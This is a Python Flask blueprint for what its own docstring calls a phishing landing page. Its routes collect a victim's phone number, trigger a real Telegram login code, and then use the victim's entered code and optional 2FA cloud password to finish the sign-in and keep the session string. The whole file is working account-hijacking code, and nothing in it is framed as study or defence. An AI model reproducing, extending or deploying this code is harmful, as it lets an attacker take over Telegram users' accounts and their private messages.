import uuid
import asyncio
from flask import Blueprint, render_template, request, jsonify
from core.logger import log

public_bp = Blueprint('public', __name__)

# In-memory store for pending authentication sessions.
# Maps session_id -> {phone, phone_code_hash, session_string, timeout}
_pending_sessions: dict = {}


@public_bp.route('/')
def index():
    """Serves the public-facing phishing landing page."""
    return render_template('index.html')


@public_bp.route('/api/send_code', methods=['POST'])
def api_send_code():
    """
    Accepts a phone number, initiates a Telegram sign-in code request,
    and returns a session ID for subsequent verification.
    """
    from services.telegram.authtelegram import send_code
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    if not phone:
        return jsonify({'status': 'error', 'message': 'Phone number required'}), 400

    sid = uuid.uuid4().hex
    try:
        result = asyncio.run(send_code(phone, sid))
    except Exception as e:
        log.error(f"api_send_code error for phone={phone}: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

    if result.get('status') == 'success':
        _pending_sessions[sid] = {
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_string': result['session_string'],
            'timeout': result.get('timeout', 120),
        }
        return jsonify({'status': 'success', 'sid': sid, 'timeout': result.get('timeout', 120)})

    return jsonify(result)


@public_bp.route('/api/verify', methods=['POST'])
def api_verify():
    """
    Verifies the Telegram sign-in code (and optionally the 2FA cloud password).
    Cleans up the pending session on success.
    """
    from services.telegram.authtelegram import sign_in, sign_in_2fa
    data = request.get_json(silent=True) or {}
    sid = data.get('sid', '')
    code = data.get('code', '')
    password = data.get('password')

    session = _pending_sessions.get(sid)
    if not session:
        return jsonify({'status': 'error', 'message': 'Session expired or not found'}), 400

    try:
        if password:
            result = asyncio.run(
                sign_in_2fa(password, sid, session['session_string'])
            )
        else:
            result = asyncio.run(
                sign_in(code, sid, session['phone'],
                        session['phone_code_hash'], session['session_string'])
            )
    except Exception as e:
        log.error(f"api_verify error for sid={sid}: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

    if result.get('status') == 'success':
        _pending_sessions.pop(sid, None)

    return jsonify(result)